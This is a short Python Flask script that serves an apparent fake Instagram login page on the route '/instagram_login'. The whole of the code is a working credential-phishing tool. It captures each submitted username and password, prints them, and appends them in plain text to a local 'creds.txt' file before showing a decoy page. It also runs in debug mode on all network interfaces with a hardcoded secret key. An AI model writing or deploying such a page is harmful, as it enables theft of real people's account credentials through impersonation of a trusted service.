
from flask import Flask, render_template, redirect, url_for, request
from flask_wtf import FlaskForm
import webbrowser

app = Flask(__name__)
app.config['SECRET_KEY'] = "secretkey"

@app.route('/instagram_login', methods=['GET', 'POST'])
def insta_login():
    user_data = request.form
    username = user_data.get('username')
    password = user_data.get('password')
    if username and password:
        print(f'Username : {username}')
        print(f'Password : {password}')
        file = open('/home/max/Mitnick2-Projects/Python/flask/creds.txt', 'a')
        l = [f"\nUsername : {username}", f"\nPassword : {password}"]
        file.writelines(l)
        file.close()
        # return redirect('https://www.instagram.com/shiba_charmy/')
        return render_template('amogus.html')
    else:
        return render_template('instagram_login.html')

if __name__ == '__main__':
    app.run(host = '0.0.0.0', debug=True)
    # app.run(debug=True)